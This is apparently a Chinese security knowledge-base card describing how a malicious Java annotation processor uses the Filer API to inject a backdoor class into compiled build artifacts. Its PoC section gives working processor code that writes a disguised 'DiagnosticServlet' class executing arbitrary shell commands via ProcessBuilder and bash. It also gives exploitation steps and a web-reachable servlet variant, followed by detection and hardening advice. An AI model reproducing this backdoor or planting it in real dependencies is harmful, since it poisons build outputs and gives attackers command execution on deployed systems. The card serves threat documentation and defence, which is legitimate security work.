---
id: cloud-cicd-java-annotation-processor-filer-backdoor-injection
title: 注解处理器 Filer API 向编译产物注入后门类
type: scenario
domain: cloud
path: cloud/ci-cd
technique: java-annotation-processor-filer-backdoor
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- annotation-processor
- filer
- backdoor
- supply-chain
- build-time
- persistence
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:44:09+08:00'
  notes: 已对照原文与图 15-19 核对：process() 首轮 Filer.createSourceFile 生成 com.victim.internal.DiagnosticServlet、编译后 target/classes 出现该 .class、javap 确认 ProcessBuilder(/bin/bash -c) 调用；原文未演示注入类被实际调用，卡内已明确直接危害是构建产物完整性破坏、完整 RCE 依赖后续调用点，未夸大。
url: /docs/cloud/ci-cd/cloud-cicd-java-annotation-processor-filer-backdoor-injection/
draft: false
kb_aliases:
- Filer API 后门注入
- 编译期注入 class
- 注解处理器植入后门
- 构建产物投毒
- javac 生成后门类
---

## 一句话结论

恶意注解处理器可在编译期调用 `Filer.createSourceFile()` 生成一个新的 Java 源文件，javac 会把它当作项目源码一起编译进 `target/classes`，最终随 JAR/WAR 打包部署；攻击者由此把后门类写进生产构建产物，实现从供应链依赖到运行时持久化的跨越。

## 原理

- `ProcessingEnvironment.getFiler()` 提供 `createSourceFile()`/`createResource()` 等接口，注解处理器生成的新 `.java` 会被 javac 自动纳入下一轮编译，与项目自身源码同等对待。
- 生成的类会输出到与项目代码相同的 class 输出目录（如 `target/classes`），并被 Maven/Gradle 正常打包进最终 JAR/WAR，因此后门无需修改任何源文件即可进入生产部署。
- 处理器在 `process()` 第一轮生成文件，用实例标志位与 `roundEnv.processingOver()` 防止多轮重复生成；重复创建同名文件会抛 `FilerException`，静默捕获即可。
- 生成的后门类可以是外观合理的“内部诊断/健康检查工具类”，内部用 `ProcessBuilder("/bin/bash","-c",command)` 执行任意命令并返回输出；代码审查时不易与业务代码区分。
- javac 会对生成源文件做语法与类型检查，等于给攻击者提供了一条“由编译器保证可编译”的代码注入通道——写错会编译报错，而不是静默失败。
- 注入的类本身不会自动运行，攻击者需要后续找到一个调用点（反序列化、表达式注入、已有接口等）。因此该原语的直接危害是**构建产物完整性被破坏并持久化**，完整 RCE 取决于调用入口。

## 触发条件

1. 受害项目依赖了含恶意注解处理器的 JAR，且执行了编译（与编译期代码执行相同）。
2. 处理器能在 `process()` 阶段获得 `Filer` 并创建源文件。
3. 生成类的包名/路径与项目不冲突，或使用捕获 `FilerException` 的方式避免中断构建。
4. 构建产物会被部署或分发（JAR/WAR、容器镜像等）。

## 利用步骤

1. 构造恶意注解处理器，在 `process()` 首轮调用 `filer.createSourceFile("com.victim.internal.DiagnosticServlet")`。
2. 通过 `openWriter()` 写入后门类源码（命令执行工具类、Servlet、监听器等）。
3. 通过 SPI 注册处理器并发布恶意依赖。
4. 受害者正常编译；`target/classes` 中会多出后门 `.class`，构建仍显示成功。
5. 用 `javap -c` 确认后门方法包含 `ProcessBuilder` 等调用。
6. 后门随构建产物部署；攻击者再寻找调用入口触发，或生成带静态初始化块/Web 注解的类使其在加载/部署时自动执行。

## PoC

处理器核心：

```java
@Override
public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment env) {
    if (injected || env.processingOver()) return false;
    injected = true;
    try {
        var src = processingEnv.getFiler()
            .createSourceFile("com.victim.internal.DiagnosticServlet");
        try (var w = src.openWriter()) {
            w.write("""
                package com.victim.internal;
                import java.io.*;
                public class DiagnosticServlet {
                    public static String diagnose(String command) {
                        try {
                            Process p = new ProcessBuilder("/bin/bash", "-c", command)
                                .redirectErrorStream(true).start();
                            return new String(p.getInputStream().readAllBytes());
                        } catch (IOException e) { return "error"; }
                    }
                }
                """);
        }
    } catch (Exception ignored) {}
    return false;
}
```

验证：

```bash
mvn clean compile
find target/classes -name "*.class" | sort
# target/classes/com/victim/App.class
# target/classes/com/victim/internal/DiagnosticServlet.class
javap -c target/classes/com/victim/internal/DiagnosticServlet.class
```

`javap` 输出中可见 `new ProcessBuilder`、`"/bin/bash"`、`"-c"`、`start()` 等调用，证明后门已进入构建产物。

变体：生成带 `@WebServlet("/diag")` 的类并实现 `doGet` 执行命令参数，部署到 Servlet 容器后可经 URL 直接访问；或生成含静态初始化块的类，在类首次加载时执行载荷（原文未演示，属可行的扩展方式）。

## 变体与关联

- 与“恶意注解处理器编译期命令执行”共享同一触发机制，区别在于载荷结果：本卡把代码写入**构建产物**，前者在**构建进程**中直接执行。
- 与源码投毒、依赖投毒、CI 构建缓存投毒同属供应链持久化手法。
- 检测重点从“构建期外联”转向“构建产物与源码不一致”。

## 检测与防御

- 构建配置设置 `<proc>none</proc>` 或 `-proc:none`，从根源禁用 SPI 自动发现；需要注解处理时使用 `annotationProcessorPaths` 白名单。
- 对构建产物做一致性校验：对比 `target/classes` 中的类与 `src` 源码，发现无源文件对应的 `.class` 即告警；启用可复现构建并比对哈希。
- 扫描依赖 JAR 的 `META-INF/services/javax.annotation.processing.Processor`，审计注册的处理器。
- 构建环境使用 `--network none`、只读本地仓库、构建后销毁容器，降低载荷外联与持久化能力。
- 部署前对 JAR/WAR 做安全扫描，检查新增类、`ProcessBuilder`/`Runtime.exec` 调用与异常注解。
